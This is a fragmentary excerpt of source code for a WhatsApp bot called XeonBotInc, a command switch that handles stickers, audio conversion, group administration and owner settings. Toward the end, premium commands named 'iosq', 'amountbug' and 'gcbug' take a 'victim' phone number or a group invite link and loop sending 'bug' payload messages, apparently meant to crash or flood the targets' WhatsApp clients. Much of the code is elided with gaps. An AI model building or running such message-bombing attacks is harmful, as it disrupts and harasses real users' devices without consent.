...
module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
    try {
        ...
        var prefix = prefa ? /^!quran\s*(\d+)\s*(\d+)?\s*(juz\s*(\d+))?$/i.test(body) ? body.match(/^!quran\s*(\d+)\s*(\d+)?\s*(juz\s*(\d+))?$/i)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)        
        const cmd = body.replace(prefix, ' ').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(cmd, '').slice(1).trim()
...
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": "https://i.ibb.co/CtQfpSQ/139457966.jpg",
"sourceUrl": `${link}`}}},
{ quoted: m})
}
...
senddocu(buffer)
        ...
        switch (cmd) {
            ...
            case 'autoread':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + cmd} on/off`)
                if (q === 'on') {
                    autoread = true
    ...
    case 'autostatusview':{
             if (!isCreator) return XeonStickOwner()
               ...
               if (args[0] === 'on') {
                  autoswview = true
                  replygcxeon(`${cmd} is enabled`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  replygcxeon(`${cmd} is disabled`)
               }
            }
            break
            case 'autobio':
            ...
            case 'mode':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + cmd} public/self`)
                if (q == 'public') {
            ...
            case 'setexif':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!text) return replygcxeon(`Example : ${prefix + cmd} packname|author`)
            ...
            case 'setppbot':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + cmd}`)
                if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + cmd}`)
                if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + cmd}`)
            ...
            case 'bcgroup': {
                if (!isCreator) return replygcxeon(mess.owner)
                if (!text) return replygcxeon(`Which text?\n\nExample : ${prefix + cmd} It's holiday tomorrow `)
            ...
            case 'totag':
                ...
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!isAdmins) return replygcxeon(mess.admin)
                if (!m.quoted) return replygcxeon(`Reply messages with captions ${prefix + cmd}`)
                XeonBotInc.sendMessage(m.chat, {
            ...
            case 'grup':
                ...
                if (args[0] === 'close') {
                    ...
                    replygcxeon(`Mode ${cmd}\n\n\nType ${prefix + cmd}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return replygcxeon(mess.group)
                ...
                await XeonBotInc.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            ...
                            thumbnailUrl: 'https://i.ibb.co/CtQfpSQ/139457966.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
...
break
            ...
            case 'stiker':
            case 's': {
                if (!quoted) return replygcxeon(`Reply to Video/Image With Caption ${prefix + cmd}`)
                if (/image/.test(mime)) {
                    ...
                    return replygcxeon(`Send Images/Videos With Captions ${prefix + cmd}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + cmd} text1|text2`
...
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + cmd}*`)
                replygcxeon(mess.wait)
            ...
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + cmd}`)
                replygcxeon(mess.wait)
            ...
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + cmd}`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                XeonBotInc.sendMessage(m.chat, {
            ...
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Reply Video/Audio that you want to make into a VN with caption ${prefix + cmd}`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
            ...
            case 'emojimix': {
                ...
                if (!emoji1) return replygcxeon(`Example : ${prefix + cmd} 😅+🤔`)
                if (!emoji2) return replygcxeon(`Example : ${prefix + cmd} 😅+🤔`)
                replygcxeon(mess.wait)
            ...
            case 'addowner':
                if (!isCreator) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`Use ${prefix+cmd} number\nExample ${prefix+cmd} ${ownernumber}`)
...
case 'delowner':
                if (!isCreator) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`Use ${prefix+cmd} nomor\nExample ${prefix+cmd} 916909137213`)
...
break
            case 'afk':
                ...
                break
case 'play':  case 'song': {
if (!text) return replygcxeon(`Example : ${prefix + cmd} anime whatsapp status`)
...
case 'sound160':
case 'sound161':
XeonBotInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${cmd}.mp3`)
...
case 'iosq':{
if (!isPremium) return replygcxeon(mess.prem)
if (!args[0]) return replygcxeon(`Use ${prefix+cmd} number\nExample ${prefix+cmd} 91xxxxxxxxxx`)
...
case 'iosgoogle2': {
if (!isPremium) return replygcxeon(mess.prem)
if (!args[0]) return replygcxeon(`Use ${prefix+cmd} amount\nExample ${prefix+cmd} 5`)
...
case 'amountbug': {
if (!isPremium) return replygcxeon(mess.prem)
if (!args[0]) return relygcxeon(`Use ${prefix+cmd} amount\nExample ${prefix+cmd} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
...
if (!args[0]) return replygcxeon(`Use ${prefix+cmd} number\nExample ${prefix+cmd} 916909137213`)
await loading()
if (args.length < 1) return replygcxeon(`Use ${prefix+cmd} number\nExample ${prefix+cmd} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
...
case 'gcbug' : {
if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+cmd} link\nExample ${prefix+cmd} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
